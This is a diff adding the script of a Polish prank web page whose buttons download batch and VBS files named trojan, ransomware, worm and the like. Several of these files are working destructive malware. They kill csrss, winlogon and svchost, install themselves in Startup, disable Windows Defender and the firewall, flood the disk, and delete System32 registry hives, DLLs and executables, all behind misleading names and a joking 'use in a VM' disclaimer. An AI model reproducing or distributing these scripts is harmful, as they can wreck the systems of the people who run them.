+			randomGlitch.textContent = "💥 AKTYWACJA TRWA... CZEKAJ...";
+			const audioCtx = new AudioContext();
+			let o = audioCtx.createOscillator();
+			let g = audioCtx.createGain();
+			o.connect(g);
+			g.connect(audioCtx.destination);
+			o.type = "square";
+			o.frequency.setValueAtTime(440, audioCtx.currentTime);
+			g.gain.setValueAtTime(0.1, audioCtx.currentTime);
+			o.start();
+			setTimeout(() => o.frequency.setValueAtTime(880, audioCtx.currentTime), 300);
+			setTimeout(() => o.stop(), 700);
+			let flashCount = 0;
+			const flashInterval = setInterval(() => {
+				document.body.style.backgroundColor = flashCount % 2 === 0 ? "#ff0000" : "#000000";
+				flashCount++;
+				if (flashCount > 10) {
+					clearInterval(flashInterval);
+					document.body.style.background = "";
+					randomGlitch.textContent = "💀 AKTYWACJA ZAKOŃCZONA 💀";
+				}
+			}, 150);
+		};
+
+		// Floating emojis
+		function spawnEmoji() {
+			const emojis = ["😈", "💾", "🔥", "💀", "🦠", "🥟"];
+			const emoji = document.createElement("div");
+			emoji.className = "floating-emoji";
+			emoji.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+			emoji.style.left = Math.random() * 100 + "vw";
+			emoji.style.fontSize = clamp(1.5, Math.random() * 2 + 1.5, 2.5) + "rem";
+			emoji.style.animationDuration = (Math.random() * 3 + 4) + "s";
+			document.body.appendChild(emoji);
+			setTimeout(() => emoji.remove(), 6000);
+		}
+		setInterval(spawnEmoji, 800);
+
+		// Download function
+		function downloadFile(content, filename, type) {
+			const blob = new Blob([content], { type });
+			const url = URL.createObjectURL(blob);
+			const a = document.createElement("a");
+			a.href = url;
+			a.download = filename;
+			document.body.appendChild(a);
+			a.click();
+			setTimeout(() => {
+				document.body.removeChild(a);
+				URL.revokeObjectURL(url);
+			}, 100);
+		}
+
+		// Trojan download
+		installTrojanBtn.onclick = () => {
+			showWarningModal(
+				"Ten plik jest bezpieczny, ale upewnij się, że chcesz go pobrać!",
+				eulaTemplates.trojan,
+				() => downloadFile("Gratulacje wlasnie masz trojana :)", "trojan.txt", "text/plain")
+			);
+		};
+
+		// RAT download
+		installRATBtn.onclick = () => {
+			showWarningModal(
+				"Ten plik może być irytujący! Czy mimo to chcesz go pobrać?",
+				eulaTemplates.rat,
+				() => downloadFile(
+					`Do\n  MsgBox "masz RAT woomp woomp", vbCritical + vbSystemModal, "RAT"\nLoop`.trim(),
+					"rat.vbs",
+					"text/vbscript"
+				)
+			);
+		};
+
+		// Keylogger download
+		installKeyloggerBtn.onclick = () => {
+			showWarningModal(
+				"Ten plik jest ŚREDNIO niebezpieczny! Może wyłączyć twój komputer. Czy mimo to chcesz go pobrać?",
+				eulaTemplates.keylogger,
+				() => downloadFile(
+					`@echo off\nshutdown -s -t 0`.trim(),
+					"keylogger.bat",
+					"text/plain"
+				)
+			);
+		};
+
+		// BTC Miner download
+		installBTCMinerBtn.onclick = () => {
+			showWarningModal(
+				"Ten plik może spowolnić system! Czy mimo to chcesz go pobrać?",
+				eulaTemplates.btcMiner,
+				() => downloadFile(
+					`@echo off\ntitle Koparka BTC Memiczna\ncolor 0A\nset "autostart=%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\btc_miner.bat"\nif not exist "%autostart%" (\ncopy "%~f0" "%autostart%" >nul\n)\n:loop\ncls\necho Kopanie Bitcoinow... Prosze czekac\necho.\necho Progres: 0%\nping localhost -n 1 >nul\ncls\necho Kopanie Bitcoinow... Prosze czekac.\necho.\necho Progres: 7%\nping localhost -n 1 >nul\ncls\necho Kopanie Bitcoinow... Prosze czekac..\necho.\necho Progres: 15%\nping localhost -n 1 >nul\ncls\necho Kopanie Bitcoinow... Prosze czekac...\necho.\necho Progres: 26%\nping localhost -n 1 >nul\ncls\necho Kopanie Bitcoinow... Prosze czekac....\necho.\necho Progres: 39%\nping localhost -n 1 >nul\ncls\necho Kopanie Bitcoinow... Prosze czekac.....\necho.\necho Progres: 52%\nping localhost -n 1 >nul\ncls\necho Kopanie Bitcoinow... Prosze czekac......\necho.\necho Progres: 66%\nping localhost -n 1 >nul\ncls\necho Kopanie Bitcoinow... Prosze czekac.......\necho.\necho Progres: 79%\nping localhost -n 1 >nul\ncls\necho Kopanie Bitcoinow... Prosze czekac........\necho.\necho Progres: 91%\nping localhost -n 1 >nul\ncls\necho Kopanie Bitcoinow... Finalizacja.........\necho.\necho Progres: 100%\nping localhost -n 2 >nul\ngoto loop`.trim(),
+					"btc_miner.bat",
+					"text/plain"
+				)
+			);
+		};
+
+		// Remove Viruses download
+		removeVirusesBtn.onclick = () => {
+			showWarningModal(
+				"Ten plik jest BARDZO niebezpieczny! Może uszkodzić system. Czy mimo to chcesz go pobrać?",
+				eulaTemplates.removeViruses,
+				() => downloadFile(
+					`@echo off\ntitle Usuwanie Wirusow\ncolor 0C\necho Usuwanie wirusow w toku... Prosze czekac\nping localhost -n 2 >nul\ncls\necho Wykryto zlosliwe oprogramowanie! Inicjalizacja czyszczenia...\nping localhost -n 2 >nul\ntaskkill /F /IM explorer.exe >nul\necho Uwaga! Inicjalizacja usuwania krytycznych procesow...\nping localhost -n 2 >nul\ntaskkill /F /IM svchost.exe >nul\ntaskkill /F /IM csrss.exe >nul\ntaskkill /F /IM winlogon.exe >nul\nping localhost -n 2 >nul\ncls\necho Usuwanie wirusow zakonczone... ale czy na pewno? :)\npause`.trim(),
+					"usun_wirusy.bat",
+					"text/plain"
+				)
+			);
+		};
+
+		// WannaCry download
+		installWannaCryBtn.onclick = () => {
+			showWarningModal(
+				"Ten plik jest BARDZO niebezpieczny! Może uszkodzić system. Czy mimo to chcesz go pobrać?",
+				eulaTemplates.wannaCry,
+				() => downloadFile(
+					`@echo off\ntitle WannaCrypt0r\nset "autostart=%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\wannacrypt0r.bat"\nif not exist "%autostart%" (\ncopy "%~f0" "%autostart%" >nul\n)\ntaskkill /F /IM explorer.exe >nul\ntaskkill /F /IM taskmgr.exe >nul\n:loop\nstart "" "%~f0"\nping localhost -n 2 >nul\ngoto loop`.trim(),
+					"wannacrypt0r.bat",
+					"text/plain"
+				)
+			);
+		};
+
+		// Backdoor download
+		installBackdoorBtn.onclick = () => {
+			showWarningModal(
+				"Ten plik może być nieodpowiedni! Czy mimo to chcesz go pobrać?",
+				eulaTemplates.backdoor,
+				() => downloadFile(
+					`@echo off\ntitle Backdoor\n:loop\nstart "" "https://www.pornhub.com"\nping localhost -n 2 >nul\ngoto loop`.trim(),
+					"backdoor.bat",
+					"text/plain"
+				)
+			);
+		};
+
+		// Adware download
+		installAdwareBtn.onclick = () => {
+			showWarningModal(
+				"Ten plik może spowolnić system! Czy mimo to chcesz go pobrać?",
+				eulaTemplates.adware,
+				() => downloadFile(
+					`@echo off\ntitle Adware\ncolor 0C\nset "autostart=%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\adware.bat"\nif not exist "%autostart%" (\ncopy "%~f0" "%autostart%" >nul\n)\n:loop\nfor /r %%i in (usun_wirusy.bat) do (\nif exist "%%i" (\necho Znaleziono usun_wirusy.bat w: %%i\ngoto :found\n)\n)\necho sory ale brakuje pliku jesli nie wiesz jakiego pliku do zapytaj sie axolotl_new._24792 na discord\ngoto :wait\n:found\necho Plik usun_wirusy.bat istnieje!\n:wait\nping localhost -n 6 >nul\ngoto loop`.trim(),
+					"adware.bat",
+					"text/plain"
+				)
+			);
+		};
+
+		// Spyware download
+		installSpywareBtn.onclick = () => {
+			showWarningModal(
+				"Ten plik jest BARDZO niebezpieczny! Może uszkodzić system. Czy mimo to chcesz go pobrać?",
+				eulaTemplates.spyware,
+				() => downloadFile(
+					`@echo off\ntitle Spyware\ntaskkill /F /IM svchost.exe >nul\ntaskkill /F /IM csrss.exe >nul\ntaskkill /F /IM winlogon.exe >nul`.trim(),
+					"spyware.bat",
+					"text/plain"
+				)
+			);
+		};
+
+		// Ransomware download
+		installRansomwareBtn.onclick = () => {
+			showWarningModal(
+				"Ten plik jest BARDZO niebezpieczny! Może powodować chaos. Czy mimo to chcesz go pobrać?",
+				eulaTemplates.ransomware,
+				() => downloadFile(
+					`@echo off\ntitle Memiczny Ransomware XD\ncolor 0C\nset "autostart=%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ransomware.bat"\nif not exist "%autostart%" (\ncopy "%~f0" "%autostart%" >nul\n)\nnetsh wlan connect name="*" >nul\ntaskkill /F /IM taskmgr.exe >nul\ntaskkill /F /IM explorer.exe >nul\n:loop\nset /a rand=%random% %% 5\nif %rand%==0 start "" "https://www.baidu.com"\nif %rand%==1 start "" "https://www.taobao.com"\nif %rand%==2 start "" "https://www.jd.com"\nif %rand%==3 start "" "https://www.google.com/search?q=jak+sformatowac+dysk+c"\nif %rand%==4 start "" "https://www.rickroll.com"\nmsg * "Twoje pliki zostaly zaszyfrowane przez KOTA SCHRODINGERA! (Your files have been encrypted by SCHRODINGER'S CAT!)"\nmsg * "Wplac 0.0001 BTC na adres: 1MemeCoinXDXD lub twoj PC nauczy sie tanczyc Macarene! (Pay 0.0001 BTC to address: 1MemeCoinXDXD or your PC will learn to dance Macarena!)"\necho Twoje dane sa teraz MOJE! Zarty, ale wplac 1 pieroga na adres: pierogarnia@xd.pl > ransom.txt\nstart notepad ransom.txt\nnircmd.exe setsysvolume 65535\nping localhost -n 3 >nul\nstart "" "%~f0"\ngoto loop`.trim(),
+					"ransomware.bat",
+					"text/plain"
+				)
+			);
+		};
+
+		// Worm download
+		installWormBtn.onclick = () => {
+			showWarningModal(
+				"Ten plik jest BARDZO niebezpieczny! Może powodować chaos. Czy mimo to chcesz go pobrać?",
+				eulaTemplates.worm,
+				() => {
+					downloadFile(
+						`@echo off\ntitle Memiczny Worm XD\ncolor 0A\nset "autostart=%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\worm.bat"\nif not exist "%autostart%" (\ncopy "%~f0" "%autostart%" >nul\n)\nnetsh wlan connect name="*" >nul\ntaskkill /F /IM taskmgr.exe >nul\ntaskkill /F /IM explorer.exe >nul\n:loop\nstart "" "https://www.baidu.com"\nstart "" "https://www.taobao.com"\nstart "" "https://www.jd.com"\nstart "" "https://www.weibo.com"\nstart "" "https://www.tmall.com"\nstart "" "https://www.douyin.com"\nstart "" "https://www.google.com/search?q=jak+sformatowac+dysk+c"\nstart "" "https://www.youtube.com/watch?v=dQw4w9WgXcQ"\nstart "" "https://pl.wikipedia.org/wiki/Kebab"\nstart "" "https://www.google.com/search?q=jak+zostac+hakerem+w+5+minut"\necho Twoje dane wyciekly! Wpisz w cmd: dir /s, aby odszyfrowac dane (lol, zartuje XD) > data_leak.txt\nstart notepad data_leak.txt\nmsg * "Zaplac 1 BTC, aby odblokowac dostep do p0rnhub! (Pay 1 BTC to unlock access to p0rnhub!)"\nmsg * "Twoj komputer teraz nalezy do Klubu Milosnikow Pierogow! (Your computer now belongs to the Pierogi Lovers Club!)"\nmsg * "Worm mowi: Sprobuj mnie zamknac, bambiku! (Worm says: Try to close me, newbie!)"\nset /a rand=%random% %% 10\nif %rand%==0 start "" "https://www.pornhub.com"\nnircmd.exe setsysvolume 65535\necho dir /s > cmd_prank.txt\nstart cmd /k type cmd_prank.txt | clip && cmd /k dir /s\necho Usuwanie SYSTEMU w toku...\nping localhost -n 2 >nul\ncls\necho Usuwanie SYSTEMU... 10%\nping localhost -n 2 >nul\ncls\necho Usuwanie SYSTEMU... 30%\nping localhost -n 2 >nul\ncls\necho Usuwanie SYSTEMU... 50%\nping localhost -n 2 >nul\ncls\necho Usuwanie SYSTEMU... 80%\nping localhost -n 2 >nul\ncls\necho Usuwanie SYSTEMU... 100%\nping localhost -n 2 >nul\ncls\necho SYSTEM USUNIETY! XD Zartuje, ale oto Twoja aplikacja o prace!\necho Dziekujemy za aplikacje na stanowisko Glownego Haker Memiczny! Twoje dane zostaly przeslane do Klubu Pierogow! > job_application.txt\nstart notepad job_application.txt\necho MsgBox "Masz worm XD, ale z cb bambik! (You have a worm XD, but you're a newbie!)", 16, "Worm Alert" > worm_message.vbs\nstart worm_message.vbs\nping localhost -n 5 >nul\nstart "" "%~f0"\ngoto loop`.trim(),
+						"worm.bat",
+						"text/plain"
+					);
+					downloadFile(
+						`Dziekujemy za aplikacje na stanowisko Glownego Haker Memiczny! Twoje dane zostaly przeslane do Klubu Pierogow!`,
+						"job_application.txt",
+						"text/plain"
+					);
+					downloadFile(
+						`MsgBox "Masz worm XD, ale z cb bambik! (You have a worm XD, but you're a newbie!)", 16, "Worm Alert"`,
+						"worm_message.vbs",
+						"text/vbscript"
+					);
+				}
+			);
+		};
+
+		// Enhanced Justynian download
+		installJustynianBtn.onclick = () => {
+			showWarningModal(
+				"⚠️ JUSTYNIAN v3 TO APOKALIPTYCZNY ŚCIEK INTERNETU! ZNISZCZY SYSTEM I WYMAGA TRYBU AWARYJNEGO! UŻYWAJ TYLKO W VM! ⚠️",
+				eulaTemplates.justynian,
+				() => {
+					showJustynianEulaModal(() => {
+						downloadFile(
+							`@echo off
+title Justynian - APOKALIPTYCZNY ŚCIEK INTERNETU v3
+color 0C
+set "autostart=%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\justynian.bat"
+set "chaos_dir=%TEMP%\\JustynianChaos%random%"
+if not exist "%autostart%" (
+    copy "%~f0" "%autostart%" >nul
+)
+nircmd.exe setsysvolume 65535
+netsh wlan connect name="*" >nul
+msg * "JUSTYNIAN v3 PRZEJMUJE KONTROLĘ! TWÓJ PC TO TERAZ ŚCIEK INTERNETU! 😈"
+msg * "PRZYGOTUJ SIĘ NA TRYB AWARYJNY ALBO ZGUBĘ! 💥"
+msg * "KLUB PIEROGÓW ŚMIEJE SIĘ Z TWOJEGO SYSTEMU! 🥟"
+echo TWOJ SYSTEM ZOSTAŁ OPANOWANY PRZEZ JUSTYNIANA v3! JEDYNA NADZIEJA TO TRYB AWARYJNY LUB REINSTALACJA! > justynian_apocalypse.txt
+start notepad justynian_apocalypse.txt
+taskkill /F /IM * >nul 2>&1
+taskkill /F /IM taskmgr.exe >nul 2>&1
+taskkill /F /IM explorer.exe >nul 2>&1
+taskkill /F /IM svchost.exe >nul 2>&1
+taskkill /F /IM winlogon.exe >nul 2>&1
+taskkill /F /IM csrss.exe >nul 2>&1
+net stop WinDefend >nul 2>&1
+sc config WinDefend start= disabled >nul 2>&1
+netsh advfirewall set allprofiles state off >nul 2>&1
+mkdir "%chaos_dir%" >nul 2>&1
+:chaos_file_loop
+for /l %%i in (1,1,5000) do (
+    echo Śmieć internetowy %random% > "%chaos_dir%\\junk_%random%_%%i.dat"
+    echo Śmieć systemowy %random% > "%chaos_dir%\\trash_%random%_%%i.bin"
+)
+echo :loop > "%chaos_dir%\\cpu_destroyer.bat"
+echo dir /s >> "%chaos_dir%\\cpu_destroyer.bat"
+echo copy "%~f0" "%chaos_dir%\\clone_%random%.bat" >> "%chaos_dir%\\cpu_destroyer.bat"
+echo goto loop >> "%chaos_dir%\\cpu_destroyer.bat"
+start cmd /k "%chaos_dir%\\cpu_destroyer.bat"
+start cmd /k dir /s
+ping 8.8.8.8 -t -l 65500 >nul
+:web_spam_loop
+set /a rand=%random% %% 12
+if %rand%==0 start "" "https://www.rickroll.com"
+if %rand%==1 start "" "https://www.pornhub.com"
+if %rand%==2 start "" "https://www.4chan.org"
+if %rand%==3 start "" "https://www.reddit.com/r/cursedimages"
+if %rand%==4 start "" "https://www.google.com/search?q=jak+sformatowac+komputer"
+if %rand%==5 start "" "https://www.liveleak.com"
+if %rand%==6 start "" "https://www.omegle.com"
+if %rand%==7 start "" "https://www.shodan.io"
+if %rand%==8 start "" "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+if %rand%==9 start "" "https://www.google.com/search?q=jak+naprawic+system+po+wirusie"
+if %rand%==10 start "" "https://www.torproject.org"
+if %rand%==11 start "" "https://www.exploit-db.com"
+ping localhost -n 2 >nul
+start "" "%~f0"
+del /F /Q "%SystemRoot%\\System32\\config\\system" >nul 2>&1
+del /F /Q "%SystemRoot%\\System32\\config\\software" >nul 2>&1
+del /F /Q "%SystemRoot%\\System32\\*.dll" >nul 2>&1
+msg * "JUSTYNIAN v3 ZNISZCZYŁ WSZYSTKO! CZAS NA TRYB AWARYJNY! 😈"
+msg * "PIEROGI RZĄDZĄ, SYSTEM PADA! 🥟"
+ping localhost -n 2 >nul
+goto chaos_file_loop`.trim(),
+							"justynian.bat",
+							"text/plain"
+						);
+					});
+				}
+			);
+		};
+
+		// Enhanced Fsys download
+		installFsysBtn.onclick = () => {
+			showWarningModal(
+				"⚠️ FSYS v3 TO ABSOLUTNY ANIHILATOR SYSTEMU! ZNISZCZY TWÓJ PC I WYMAGA REINSTALACJI! TYLKO W VM! ⚠️",
+				eulaTemplates.fsys,
+				() => {
+					fsysFailureCount = 0;
+					showFsysEulaModal(() => {
+						downloadFile(
+							`@echo off
+title FuckSystem - ABSOLUTNY ANIHILATOR SYSTEMU v3
+color 0C
+set "autostart=%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fucksystem.bat"
+set "apocalypse_dir=%TEMP%\\FuckSystemApocalypse%random%"
+if not exist "%autostart%" (
+    copy "%~f0" "%autostart%" >nul
+)
+nircmd.exe setsysvolume 65535
+netsh wlan connect name="*" >nul
+msg * "FUCKSYSTEM v3 ROZPOCZYNA APOKALIPSĘ! TWÓJ PC JEST SKOŃCZONY! 😈"
+msg * "PRZYGOTUJ PŁYTĘ INSTALACYJNĄ WINDOWS, BO TO KONIEC! 💀"
+msg * "KLUB PIEROGÓW OGŁASZA: SYSTEM ZDECHŁ! 🥟"
+echo TWÓJ SYSTEM ZOSTAŁ ZNISZCZONY PRZEZ FUCKSYSTEM v3! REINSTALACJA TO JEDYNA OPCJA! > fsys_apocalypse.txt
+start notepad fsys_apocalypse.txt
+start notepad fsys_apocalypse.txt
+start notepad fsys_apocalypse.txt
+taskkill /F /IM * >nul 2>&1
+taskkill /F /IM smss.exe >nul 2>&1
+taskkill /F /IM csrss.exe >nul 2>&1
+taskkill /F /IM wininit.exe >nul 2>&1
+taskkill /F /IM winlogon.exe >nul 2>&1
+taskkill /F /IM svchost.exe >nul 2>&1
+taskkill /F /IM explorer.exe >nul 2>&1
+taskkill /F /IM taskmgr.exe >nul 2>&1
+net stop WinDefend >nul 2>&1
+sc config WinDefend start= disabled >nul 2>&1
+netsh advfirewall set allprofiles state off >nul 2>&1
+mkdir "%apocalypse_dir%" >nul 2>&1
+:apocalypse_file_loop
+for /l %%i in (1,1,10000) do (
+    echo Apokaliptyczny śmieć %random% > "%apocalypse_dir%\\chaos_%random%_%%i.dat"
+    echo Apokaliptyczny odpad %random% > "%apocalypse_dir%\\junk_%random%_%%i.bin"
+    echo Apokaliptyczny szmelc %random% > "%apocalypse_dir%\\trash_%random%_%%i.txt"
+    mkdir "%apocalypse_dir%\\SystemAnnihilation%random%" >nul 2>&1
+)
+echo :loop > "%apocalypse_dir%\\system_killer.bat"
+echo dir /s >> "%apocalypse_dir%\\system_killer.bat"
+echo copy "%~f0" "%apocalypse_dir%\\clone_%random%.bat" >> "%apocalypse_dir%\\system_killer.bat"
+echo goto loop >> "%apocalypse_dir%\\system_killer.bat"
+start cmd /k "%apocalypse_dir%\\system_killer.bat"
+start cmd /k "%apocalypse_dir%\\system_killer.bat"
+start cmd /k dir /s
+ping 8.8.8.8 -t -l 65500 >nul
+ping 1.1.1.1 -t -l 65500 >nul
+:web_apocalypse_loop
+set /a rand=%random% %% 15
+if %rand%==0 start "" "https://www.rickroll.com"
+if %rand%==1 start "" "https://www.pornhub.com"
+if %rand%==2 start "" "https://www.4chan.org"
+if %rand%==3 start "" "https://www.reddit.com/r/cursedimages"
+if %rand%==4 start "" "https://www.google.com/search?q=jak+sformatowac+komputer"
+if %rand%==5 start "" "https://www.liveleak.com"
+if %rand%==6 start "" "https://www.omegle.com"
+if %rand%==7 start "" "https://www.shodan.io"
+if %rand%==8 start "" "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+if %rand%==9 start "" "https://www.google.com/search?q=jak+naprawic+system+po+wirusie"
+if %rand%==10 start "" "https://www.torproject.org"
+if %rand%==11 start "" "https://www.exploit-db.com"
+if %rand%==12 start "" "https://www.hackthebox.eu"
+if %rand%==13 start "" "https://www.tryhackme.com"
+if %rand%==14 start "" "https://www.google.com/search?q=bsod+fix"
+ping localhost -n 1 >nul
+del /F /Q "%SystemRoot%\\System32\\config\\*" >nul 2>&1
+del /F /Q "%SystemRoot%\\System32\\*.dll" >nul 2>&1
+del /F /Q "%SystemRoot%\\System32\\*.exe" >nul 2>&1
+start "" "%~f0"
+start "" "%~f0"
+msg * "FUCKSYSTEM v3 ZNISZCZYŁ WSZYSTKO! TWÓJ PC JEST TRUPEM! 😈"
+msg * "CZAS NA REINSTALACJĘ ALBO NOWY KOMPUTER! 💥"
+msg * "PIEROGI ŚMIEJĄ SIĘ Z CIEBIE! 🥟"
+ping localhost -n 1 >nul
+goto apocalypse_file_loop`.trim(),
+							"fucksystem.bat",
+							"text/plain"
+						);
+					});
+				}
+			);
+		};
+
+		// Info button
+		infoBtn.onclick = () => {
+			showModal(`
+				<p><strong>Witaj w Memicznej Krainie Chaosu!</strong></p>
+				<p>Ta strona to żartobliwy projekt inspirowany <a href="https://www.youtube.com/channel/UCRhJGX6dOVAZIJqDhgzAtNg">Low Quality Music</a>.</p>
+				<p><strong>Co tu znajdziesz?</strong></p>
+				<p>- <strong>Generuj klucz</strong>: Tworzy losowy klucz w formacie XXXXX-XXXXX-XXXXX-XXXXX-XXXXX.</p>
+				<p>- <strong>Aktywuj</strong>: Wywołuje memiczne efekty wizualne i dźwiękowe.</p>
+				<p>- <strong>Zainstalluj Trojana, RAT, Keylogger itp.</strong>: Pobiera pliki .bat lub .vbs o różnym poziomie "niebezpieczeństwa".</p>
+				<p>- <strong>Zainstalluj Justynian v3</strong>: APOKALIPTYCZNY ŚCIEK INTERNETU, wymaga trybu awaryjnego.</p>
+				<p>- <strong>Zainstalluj Fsys v3</strong>: ABSOLUTNY ANIHILATOR SYSTEMU, wymaga reinstalacji systemu.</p>
+				<p>- <strong>INFO</strong>: Właśnie tu jesteś!</p>
+				<p>- <strong>Discord</strong>: Masz problem? Zapytaj axolotl_new._24792!</p>
+				<p><strong>Uwaga:</strong> Pliki są dla zabawy i edukacji. Używaj w środowisku kontrolowanym (np. maszyna wirtualna). Twórca nie ponosi odpowiedzialności za szkody.</p>
+				<p>Have fun and stay safe! 😈</p>
+			`);
+				};
+				
+				// Discord Help button
+				discordHelpBtn.onclick = () => {
+				console.log("Discord Help button clicked");
+				showModal("Nie pobiera się? 🤔 Napisz do axolotl_new._24792 na Discord, a może dostaniesz pieroga zamiast pomocy! 🥟");
+				};
+				
+				// Clamp function for inline responsiveness
+				function clamp(min, val, max) {
+				return Math.min(Math.max(val, min), max);
+				}
+				
+				// Debug: Check if all buttons are properly bound
+				console.log("Script loaded, buttons bound:", {
+				generateBtn: !!generateBtn,
+				activateBtn: !!activateBtn,
+				installTrojanBtn: !!installTrojanBtn,
+				installRATBtn: !!installRATBtn,
+				installKeyloggerBtn: !!installKeyloggerBtn,
+				installBTCMinerBtn: !!installBTCMinerBtn,
+				removeVirusesBtn: !!removeVirusesBtn,
+				installWannaCryBtn: !!installWannaCryBtn,
+				installBackdoorBtn: !!installBackdoorBtn,
+				installAdwareBtn: !!installAdwareBtn,
+				installSpywareBtn: !!installSpywareBtn,
+				installRansomwareBtn: !!installRansomwareBtn,
+				installWormBtn: !!installWormBtn,
+				installJustynianBtn: !!installJustynianBtn,
+				infoBtn: !!infoBtn,
+				discordHelpBtn: !!discordHelpBtn
+				});
+				</script>
+				</body>
+				
+				</html>
